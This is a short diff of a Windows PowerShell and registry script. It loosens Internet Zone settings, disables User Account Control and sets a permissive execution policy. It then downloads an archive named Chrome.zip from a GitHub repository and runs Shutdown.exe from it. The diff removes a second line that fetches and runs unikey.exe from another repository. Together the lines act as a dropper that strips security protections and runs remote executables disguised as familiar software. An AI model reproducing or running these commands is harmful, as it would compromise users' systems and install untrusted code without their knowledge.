@@ -4,4 +4,3 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\
 REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /V "1806" /T "REG_DWORD" /D "00000000" /F;
 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f;
 Set-ExecutionPolicy RemoteSigned -Force;$Url = 'https://github.com/chatOPT/chat/raw/main/Chrome.zip';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';;Invoke-WebRequest $Url -OutFile Chrome.zip;Expand-Archive Chrome.zip -DestinationPath Chrome;Set-Location Chrome; .\Shutdown.exe;
-Set-ExecutionPolicy RemoteSigned -Force;$Url = 'https://github.com/jokermakelove/ChatGPT/raw/main/unikey.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';;Invoke-WebRequest $Url -OutFile unikey.exe;.\unikey.exe -fullinstall;
